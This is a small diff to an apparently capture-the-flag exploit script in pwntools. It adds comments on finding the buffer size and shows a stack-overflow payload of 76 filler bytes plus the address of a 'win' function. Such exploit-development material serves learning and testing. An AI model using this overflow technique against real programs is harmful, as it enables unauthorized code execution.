@@ -52,6 +52,10 @@ else:
     p = process(FILENAME)
     elf = p.elf
 
+# you could find the buffer size by trial and error,
+# using the `cyclic` function from `pwntools` and seeing where it segfaults using `dmesg -T | tail | grep segfault`,
+# or looking at the disassembly
+# using `cutter` we see that in `vuln` there is a comment `; var char *s @ ebp-0x48`
 payload = b"A"*76 + pack(elf.sym['win'])
 p.sendlineafter("something?", payload)
 
